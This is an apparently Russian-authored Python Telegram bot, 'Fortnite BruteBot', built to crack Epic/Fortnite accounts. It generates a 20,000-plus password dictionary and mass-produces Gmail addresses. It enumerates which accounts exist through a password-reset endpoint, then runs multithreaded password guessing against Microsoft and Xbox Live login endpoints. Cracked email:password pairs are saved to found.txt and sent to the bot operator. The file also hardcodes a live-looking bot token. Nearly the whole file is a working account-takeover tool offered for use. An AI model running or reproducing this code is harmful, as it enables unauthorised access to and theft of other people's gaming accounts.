#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import telebot
import requests
import random
import string
import time
import os
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

BOT_TOKEN = "8874004875:AAEslk0sxxDKXNnWtvggCc3RKUTJB4NwV14"
bot = telebot.TeleBot(BOT_TOKEN)

# ============================================================
#  ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
# ============================================================
stop_flag = False
current_process = None

# ============================================================
#  ГЕНЕРАЦИЯ СЛОВАРЯ (20 000+)
# ============================================================
BASE_WORDS = [
    "password", "qwerty", "admin", "root", "toor", "ubuntu", "linux", "kali", "parrot",
    "blackbox", "research", "fortnite", "epicgames", "battle", "royale", "gaming",
    "winning", "legend", "dragon", "killer", "master", "michael", "jordan", "jennifer",
    "thomas", "charlie", "robert", "daniel", "jessica", "michelle", "amanda", "ashley",
    "nicole", "matthew", "andrew", "george", "joshua", "taylor", "ranger", "hunter",
    "buster", "soccer", "hockey", "baseball", "football", "superman", "batman", "starwars",
    "computer", "internet", "network", "security", "password1", "qwerty123", "admin123",
    "root123", "12345678", "123456789", "987654321", "11111111", "00000000",
    "user", "player", "gamer", "shadow", "night", "storm", "phantom", "crystal", "blaze",
    "frost", "venom", "ranger", "hunter", "warrior", "sniper", "ninja", "pirate", "ghost",
    "wolf", "eagle", "falcon", "tiger", "bear", "panda", "koala", "slayer",
    "dark", "light", "fire", "water", "earth", "wind", "sky", "moon", "sun", "star",
    "cloud", "rain", "snow", "ice", "thunder", "lightning", "hurricane", "cyclone",
    "inferno", "blizzard", "avalanche", "tsunami", "quake", "storm", "vortex",
    "phoenix", "griffin", "unicorn", "pegasus", "dragon", "hydra", "chimera"
]

SPECIALS = ["!", "@", "#", "$", "%", "^", "&", "*", "?"]
DIGITS = "0123456789"

def generate_password_variations(base_word):
    variations = set()
    for d in DIGITS:
        variations.add(base_word + d)
        variations.add(base_word + d + "!")
        variations.add(base_word + "!" + d)
        variations.add(base_word.capitalize() + d)
        for s in SPECIALS:
            variations.add(base_word + d + s)
            variations.add(base_word + s + d)
            variations.add(base_word.capitalize() + d + s)
    for s in SPECIALS:
        variations.add(base_word + s)
        variations.add(s + base_word)
        variations.add(base_word + s + "1")
        variations.add("1" + s + base_word)
        for d in DIGITS:
            variations.add(base_word + s + d)
            variations.add(d + s + base_word)
    leet_map = {'a':'4', 'e':'3', 'i':'1', 'o':'0', 's':'5', 't':'7'}
    leet_word = ''.join(leet_map.get(c, c) for c in base_word)
    variations.add(leet_word + "!")
    variations.add(leet_word + "123")
    for d in DIGITS:
        variations.add(leet_word + d + "!")
        variations.add(leet_word + "!" + d)
    variations.add(base_word + base_word)
    variations.add(base_word + base_word + "1")
    variations.add(base_word + base_word + "!")
    for d in DIGITS:
        variations.add(base_word + base_word + d)
    for year in ["2020","2021","2022","2023","2024","2025","2026"]:
        variations.add(base_word + year)
        variations.add(year + base_word)
        variations.add(base_word.capitalize() + year + "!")
        for d in DIGITS:
            variations.add(base_word + year + d)
            variations.add(year + d + base_word)
    suffixes = ["123", "321", "abc", "xyz", "qwe", "asd", "zxc", "rty", "fgh", "vbn"]
    for sf in suffixes:
        variations.add(base_word + sf)
        variations.add(base_word + sf + "!")
        variations.add(base_word.capitalize() + sf)
    return [p for p in variations if len(p) >= 8]

PASSWORDS = []
for word in BASE_WORDS:
    PASSWORDS.extend(generate_password_variations(word))
PASSWORDS = sorted(set(PASSWORDS))
EXTRA = [
    "Password123!", "Qwerty123!", "Admin2026!", "Root@2026",
    "Fortnite@123", "EpicGames2026", "BattleRoyal!", "Gaming@2025",
    "!QAZ2wsx", "1qazxsw2", "QAZwsx123", "!@#123qwe", "P@ssw0rd2026",
    "1234567890", "0987654321", "abcdefgh", "qwertyuiop", "zxcvbnm",
    "1q2w3e4r", "1qazxsw23edc", "Qwerty2024", "Admin1234"
]
PASSWORDS.extend(EXTRA)
PASSWORDS = sorted(set(PASSWORDS))
print(f"[+] Сгенерировано {len(PASSWORDS)} паролей.")

# ============================================================
#  ФУНКЦИИ РАБОТЫ С EPIC
# ============================================================
def get_session():
    s = requests.Session()
    s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
    return s

def microsoft_auth(email, password):
    session = get_session()
    url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    data = {
        "client_id": "000000004C12AE6F",
        "scope": "service::user.auth.xboxlive.com::MBI_SSL",
        "username": email,
        "password": password,
        "grant_type": "password"
    }
    try:
        resp = session.post(url, data=data, timeout=5)
        if resp.status_code != 200:
            return None, "auth_fail"
        token_data = resp.json()
        if 'access_token' not in token_data:
            return None, "no_token"
        xbl_resp = session.post("https://user.auth.xboxlive.com/user/authenticate", json={
            "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token_data['access_token']},
            "RelyingParty": "http://auth.xboxlive.com",
            "TokenType": "JWT"
        }, timeout=5)
        if xbl_resp.status_code != 200:
            return None, "xbl_fail"
        xbl_token = xbl_resp.json().get('Token')
        xsts_resp = session.post("https://xsts.auth.xboxlive.com/xsts/authorize", json={
            "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]},
            "RelyingParty": "http://spartacertificate.epicgames.com",
            "TokenType": "JWT"
        }, timeout=5)
        if xsts_resp.status_code != 200:
            return None, "xsts_fail"
        xsts_data = xsts_resp.json()
        user_hash = xsts_data.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs')
        token = xsts_data.get('Token')
        return {'user_hash': user_hash, 'token': token}, "success"
    except:
        return None, "error"

def check_fortnite(user_hash, token):
    session = get_session()
    headers = {"Authorization": f"XBL3.0 x={user_hash};{token}", "Accept": "application/json"}
    try:
        resp = session.get("https://spartacertificate.epicgames.com/api/v2/account", headers=headers, timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            return {'full_access': True, 'account_id': data.get('accountId'), 'display_name': data.get('displayName'), 'vbucks': data.get('currency', {}).get('vbucks', 0)}
        return {'full_access': False}
    except:
        return {'full_access': False}

def attempt_login(email, password):
    auth_result, status = microsoft_auth(email, password)
    if status != "success" or auth_result is None:
        return None, status
    acc_info = check_fortnite(auth_result['user_hash'], auth_result['token'])
    if acc_info.get('full_access'):
        return {'account': acc_info}, "success"
    return None, "no_access"

def check_account_exists(email):
    session = get_session()
    try:
        resp = session.post("https://www.epicgames.com/account/v2/password/reset", json={"email": email}, timeout=3)
        return resp.status_code == 200
    except:
        return False

def brute_single(email, timeout=15):
    start = time.time()
    for pwd in PASSWORDS:
        if time.time() - start > timeout:
            return None
        result, status = attempt_login(email, pwd)
        if result is not None:
            return (pwd, result['account'])
    return None

# ============================================================
#  КОМАНДЫ БОТА
# ============================================================
@bot.message_handler(commands=['start', 'help'])
def cmd_start_help(message):
    bot.reply_to(message,
        "🤖 <b>Fortnite BruteBot</b>\n\n"
        "Доступные команды:\n"
        "/bruteforce <email> — подбор пароля для одного аккаунта\n"
        "/auto_mass [число] — массовый подбор (по умолчанию 20000)\n"
        "/show_found — показать все найденные пары\n"
        "/stop — остановить текущий процесс\n"
        "/status — статус бота\n\n"
        f"📚 Словарь: {len(PASSWORDS)} паролей\n"
        "⚡ Многопоточный режим: до 200 потоков",
        parse_mode="HTML"
    )

@bot.message_handler(commands=['bruteforce'])
def cmd_bruteforce(message):
    global stop_flag
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ Укажите email: /bruteforce target@example.com")
        return
    email = args[1]
    stop_flag = False
    bot.reply_to(message, f"⏳ Брутфорс для {email}... (до 15 сек)")
    result = brute_single(email, timeout=15)
    if result:
        pwd, acc = result
        msg = (f"✅ НАЙДЕН!\n📧 {email}\n🔑 {pwd}\n🆔 ID: {acc.get('account_id')}\n💎 V-Bucks: {acc.get('vbucks', 0)}")
        bot.reply_to(message, msg)
        with open("found.txt", "a") as f:
            f.write(f"{email}:{pwd} | ID: {acc.get('account_id')}\n")
    else:
        bot.reply_to(message, f"❌ Пароль не найден для {email}")

@bot.message_handler(commands=['auto_mass'])
def cmd_auto_mass(message):
    global stop_flag, current_process
    if current_process and current_process.is_alive():
        bot.reply_to(message, "⏳ Уже идёт процесс. Используйте /stop для остановки.")
        return
    args = message.text.split()
    count = 20000 if len(args) < 2 else int(args[1])
    stop_flag = False
    bot.reply_to(message, f"🚀 Запущен массовый подбор {count} email...")
    # Запускаем в отдельном потоке
    thread = threading.Thread(target=run_auto_mass, args=(message, count), daemon=True)
    current_process = thread
    thread.start()

def run_auto_mass(message, count):
    global stop_flag
    try:
        # Генерация email
        bot.send_message(message.chat.id, "⏳ Генерация email...")
        generated = set()
        prefixes = ["user","player","gamer","shadow","killer","master","legend","dragon","night","storm"]
        while len(generated) < count:
            if stop_flag:
                bot.send_message(message.chat.id, "⏹ Процесс остановлен пользователем.")
                return
            prefix = random.choice(prefixes)
            suffix = ''.join(random.choices(string.digits, k=4))
            generated.add(f"{prefix}{suffix}@gmail.com")
        emails = list(generated)
        bot.send_message(message.chat.id, f"✅ Сгенерировано {len(emails)} email. Проверка существования...")

        # Проверка существования
        existing = []
        lock = threading.Lock()
        progress_msg = bot.send_message(message.chat.id, f"⏳ Проверка: 0/{count}")

        def check_worker(email):
            if stop_flag:
                return
            if check_account_exists(email):
                with lock:
                    existing.append(email)
            return True

        with ThreadPoolExecutor(max_workers=200) as executor:
            futures = {executor.submit(check_worker, email): email for email in emails}
            processed = 0
            for future in as_completed(futures):
                if stop_flag:
                    executor.shutdown(wait=False)
                    bot.edit_message_text(
                        f"⏹ Остановлено. Найдено аккаунтов: {len(existing)}",
                        chat_id=progress_msg.chat.id,
                        message_id=progress_msg.message_id
                    )
                    return
                processed += 1
                if processed % 1000 == 0 or processed == count:
                    bot.edit_message_text(
                        f"⏳ Проверка: {processed}/{count} | Найдено аккаунтов: {len(existing)}",
                        chat_id=progress_msg.chat.id,
                        message_id=progress_msg.message_id
                    )
                future.result()

        bot.edit_message_text(
            f"🔍 Проверка завершена. Найдено {len(existing)} аккаунтов.",
            chat_id=progress_msg.chat.id,
            message_id=progress_msg.message_id
        )

        if not existing:
            bot.send_message(message.chat.id, "❌ Аккаунтов не найдено.")
            return

        # Брутфорс для найденных
        bot.send_message(message.chat.id, f"⚡ Брутфорс для {len(existing)} аккаунтов (до 15 сек на каждый)...")
        found = {}
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = {executor.submit(brute_single, email, 15): email for email in existing[:200]}
            for future in as_completed(futures):
                if stop_flag:
                    executor.shutdown(wait=False)
                    bot.send_message(message.chat.id, "⏹ Брутфорс остановлен.")
                    return
                email = futures[future]
                result = future.result()
                if result:
                    pwd, acc = result
                    found[email] = (pwd, acc)
                    with open("found.txt", "a") as f:
                        f.write(f"{email}:{pwd} | ID: {acc.get('account_id')}\n")
        if found:
            msg = "\n".join([f"{e}:{pwd}" for e, (pwd, _) in found.items()])
            bot.send_message(message.chat.id, f"✅ Найдено {len(found)} аккаунтов:\n<code>{msg[:4000]}</code>", parse_mode="HTML")
        else:
            bot.send_message(message.chat.id, "❌ Ничего не найдено.")
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ Ошибка: {str(e)}")
    finally:
        current_process = None

@bot.message_handler(commands=['show_found'])
def cmd_show_found(message):
    if not os.path.exists("found.txt"):
        bot.reply_to(message, "❌ Нет найденных аккаунтов.")
        return
    with open("found.txt", "r") as f:
        lines = f.readlines()
    if not lines:
        bot.reply_to(message, "❌ Файл пуст.")
        return
    pairs = []
    for line in lines:
        if ' |' in line:
            pairs.append(line.split(' |')[0])
        else:
            pairs.append(line.strip())
    content = "\n".join(pairs)
    if len(content) > 4000:
        with open("temp_pairs.txt", "w") as f:
            f.write(content)
        with open("temp_pairs.txt", "rb") as f:
            bot.send_document(message.chat.id, f, caption="📋 Все аккаунты")
        os.remove("temp_pairs.txt")
    else:
        bot.reply_to(message, f"📋 Аккаунты:\n<code>{content}</code>", parse_mode="HTML")

@bot.message_handler(commands=['status'])
def cmd_status(message):
    found_count = 0
    if os.path.exists("found.txt"):
        with open("found.txt", "r") as f:
            found_count = sum(1 for _ in f)
    bot.reply_to(message,
        f"🟢 Бот активен\n"
        f"📚 Словарь: {len(PASSWORDS)} паролей\n"
        f"🧵 Потоков: 200 (проверка) / 100 (брутфорс)\n"
        f"📂 Найдено аккаунтов: {found_count}"
    )

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    global stop_flag
    if current_process and current_process.is_alive():
        stop_flag = True
        bot.reply_to(message, "⏹ Отправлен сигнал остановки. Процесс будет прерван после текущей операции.")
    else:
        bot.reply_to(message, "ℹ️ Нет активного процесса.")

# ============================================================
#  ЗАПУСК
# ============================================================
if __name__ == "__main__":
    try:
        bot.remove_webhook()
        print("Вебхук сброшен.")
    except Exception as e:
        print(f"Ошибка сброса вебхука (игнорируем): {e}")
    print(f"Бот запущен. Словарь: {len(PASSWORDS)} паролей.")
    while True:
        try:
            bot.polling(non_stop=True, skip_pending=True)
        except Exception as e:
            print(f"Критическая ошибка в polling: {e}")
            time.sleep(3)